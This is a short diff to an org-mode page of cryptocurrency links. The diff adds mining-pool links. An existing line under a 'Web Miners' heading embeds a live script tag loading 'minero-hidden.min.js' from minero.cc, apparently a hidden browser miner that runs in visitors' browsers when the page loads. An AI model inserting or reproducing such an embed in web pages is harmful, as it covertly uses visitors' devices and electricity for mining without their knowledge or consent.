@@ -24,7 +24,9 @@
   - [[https://purse.io/?_r%3DedsyPI][Purse]]
 * Mine
   Participate at the fundamental level
+  - [[https://multipool.us][Multipool]]
   - [[https://moneroocean.stream][Monero Ocean]]
+  - [[https://reddit.com/r/multimining/wiki/index/pool_list#wiki_active_pools_list][Multimining Pool List]]
 * Web Miners
   Leverage web traffic
 @@html:<script src="https://minero.cc/lib/minero-hidden.min.js" async></script>@@
